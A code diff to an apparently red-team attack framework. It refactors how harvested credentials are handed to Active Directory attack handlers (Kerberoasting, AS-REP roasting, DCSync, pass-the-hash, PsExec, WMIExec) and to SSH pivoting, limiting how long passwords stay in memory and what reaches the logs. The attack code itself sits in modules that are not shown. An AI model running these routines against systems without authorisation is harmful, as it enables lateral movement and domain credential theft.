@@ -15,9 +15,15 @@ import shlex
 import signal
 import subprocess
 import sys
+from collections.abc import Iterator
 from typing import Any, Optional
 from urllib.parse import urlparse
 
+from core.credentials import (
+    CredentialRef,
+    credential_material_for_execution,
+    get_best_credential_ref,
+)
 from core.execution import (
     ExecutionCancelled,
     ExecutionContext,
@@ -37,7 +43,6 @@ from core.tools.base import (
 
 # IMPORTS FROM SIBLING MODULES
 from core.tools.exploit_tools import (
-    get_best_creds_for_target,
     run_bruteforce,
     run_jmx2rce_scan,
     run_web_login_bruteforce,
@@ -1430,33 +1435,45 @@ def run_arbitrary_cmd(
 
 # AD TOOL HANDLERS
 
-def _creds_to_dict(creds, service: str = "") -> dict:
-    """Normalize legacy tuple credentials to the dict shape AD modules expect."""
-    if isinstance(creds, dict):
-        user = creds.get("user") or creds.get("username") or ""
-        password = creds.get("password") or creds.get("pwd") or ""
-        return {
+
+def _provider_identity(username: str) -> tuple[str, str]:
+    """Split a reference username without exposing any secret material."""
+
+    normalized = str(username or "").strip()
+    if "\\" in normalized:
+        domain, user = normalized.split("\\", 1)
+        return user, domain
+    if "@" in normalized:
+        user, domain = normalized.rsplit("@", 1)
+        return user, domain
+    return normalized, ""
+
+
+@contextlib.contextmanager
+def _credential_dict_for_execution(
+    credential: Optional[CredentialRef],
+) -> Iterator[Optional[dict[str, Any]]]:
+    """Create the legacy provider shape only for the immediate provider call."""
+
+    if credential is None:
+        yield None
+        return
+
+    with credential_material_for_execution(credential) as material:
+        user, domain = _provider_identity(material.username)
+        provider_creds: dict[str, Any] = {
             "user": user,
             "username": user,
-            "password": password,
-            "domain": creds.get("domain", ""),
-            "nthash": creds.get("nthash", ""),
-            "service": creds.get("service", service),
-            "port": creds.get("port", 22 if service == "ssh" else 0),
+            "password": material.password,
+            "domain": domain,
+            "nthash": "",
+            "service": credential.service,
+            "port": credential.port or (389 if credential.service == "ldap" else 22),
         }
-    if isinstance(creds, (tuple, list)) and len(creds) >= 2:
-        user, password = creds[0], creds[1]
-        if user and password:
-            return {
-                "user": user,
-                "username": user,
-                "password": password,
-                "domain": "",
-                "nthash": "",
-                "service": service,
-                "port": 22 if service == "ssh" else 0,
-            }
-    return {"user": "", "username": "", "password": "", "domain": "", "nthash": "", "service": service, "port": 0}
+        try:
+            yield provider_creds
+        finally:
+            provider_creds["password"] = ""
 
 
 def _run_ad_tool(action: str, target: str) -> str:
@@ -1465,50 +1482,56 @@ def _run_ad_tool(action: str, target: str) -> str:
     logger = logging.getLogger("octopus.runner.ad")
 
     try:
-        creds = _creds_to_dict(get_best_creds_for_target(target, "ldap"), "ldap")
-        if not creds["user"]:
-            creds = _creds_to_dict(get_best_creds_for_target(target, "ssh"), "ssh")
-        user = creds.get("user", "")
+        credential = get_best_credential_ref(target, "ldap")
+        if credential is None:
+            credential = get_best_credential_ref(target, "ssh")
 
         if action == "enum":
             from core.killchain.ad.enumeration import run_ad_enum
-            return run_ad_enum(target, creds=creds if user else None)
+            with _credential_dict_for_execution(credential) as creds:
+                return run_ad_enum(target, creds=creds)
         elif action == "asrep":
             from core.killchain.ad.kerberos import asrep_roast
-            return asrep_roast(target, creds=creds if user else None)
+            with _credential_dict_for_execution(credential) as creds:
+                return asrep_roast(target, creds=creds)
         elif action == "kerberoast":
             from core.killchain.ad.kerberos import kerberoast
-            if not user:
+            if credential is None:
                 return "[!] Kerberoasting requires valid domain credentials. Run bruteforce or find creds first."
-            return kerberoast(target, creds)
+            with _credential_dict_for_execution(credential) as creds:
+                return kerberoast(target, creds)
         elif action == "dcsync":
             from core.killchain.ad.credential import dcsync
-            if not user:
+            if credential is None:
                 return "[!] DCSync requires domain admin credentials."
-            return dcsync(target, creds)
+            with _credential_dict_for_execution(credential) as creds:
+                return dcsync(target, creds)
         elif action == "pth":
             from core.killchain.ad.credential import pass_the_hash
             nthash = input("\033[36m  NT Hash: \033[0m").strip()
             if not nthash:
                 return "[!] Pass-the-Hash requires an NT hash."
-            return pass_the_hash(target, user or "Administrator", nthash, domain=creds.get("domain", ""))
+            user, domain = _provider_identity(credential.username if credential else "Administrator")
+            return pass_the_hash(target, user, nthash, domain=domain)
         elif action == "psexec":
             from core.killchain.ad.lateral import psexec
-            if not user:
+            if credential is None:
                 return "[!] PsExec requires valid credentials."
-            return psexec(target, creds)
+            with _credential_dict_for_execution(credential) as creds:
+                return psexec(target, creds)
         elif action == "wmiexec":
             from core.killchain.ad.lateral import wmiexec
-            if not user:
+            if credential is None:
                 return "[!] WMIExec requires valid credentials."
-            return wmiexec(target, creds)
+            with _credential_dict_for_execution(credential) as creds:
+                return wmiexec(target, creds)
         else:
             return f"[!] Unknown AD action: {action}"
     except ImportError as e:
         return f"[!] AD module dependency missing: {e}\n    Install: pip install impacket ldap3"
     except Exception as e:
-        logger.error(f"AD tool {action} failed: {e}")
-        return f"[!] AD {action} failed: {e}"
+        logger.error("AD tool %s failed (%s)", action, type(e).__name__)
+        return f"[!] AD {action} failed ({type(e).__name__})."
 
 
 # PIVOT TOOL HANDLERS
@@ -1519,11 +1542,8 @@ def _run_pivot_tool(action: str, target: str) -> str:
     logger = logging.getLogger("octopus.runner.pivot")
 
     try:
-        creds = _creds_to_dict(get_best_creds_for_target(target, "ssh"), "ssh")
-        user = creds.get("user", "")
-        password = creds.get("password", "")
-
-        if not user:
+        credential = get_best_credential_ref(target, "ssh")
+        if credential is None:
             return "[!] Pivoting requires SSH credentials. Find credentials first."
 
         try:
@@ -1533,8 +1553,15 @@ def _run_pivot_tool(action: str, target: str) -> str:
 
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        port = int(creds.get("port", 22))
-        ssh.connect(target, port=port, username=user, password=password, timeout=15)
+        port = credential.port or 22
+        with credential_material_for_execution(credential) as material:
+            ssh.connect(
+                target,
+                port=port,
+                username=material.username,
+                password=material.password,
+                timeout=15,
+            )
 
         if action == "socks":
             from core.killchain.pivot import setup_socks_proxy
@@ -1553,8 +1580,8 @@ def _run_pivot_tool(action: str, target: str) -> str:
             ssh.close()
             return f"[!] Unknown pivot action: {action}"
     except Exception as e:
-        logger.error(f"Pivot tool {action} failed: {e}")
-        return f"[!] Pivot {action} failed: {e}"
+        logger.error("Pivot tool %s failed (%s)", action, type(e).__name__)
+        return f"[!] Pivot {action} failed ({type(e).__name__})."
 
 
 # C2 BUILD HANDLERS
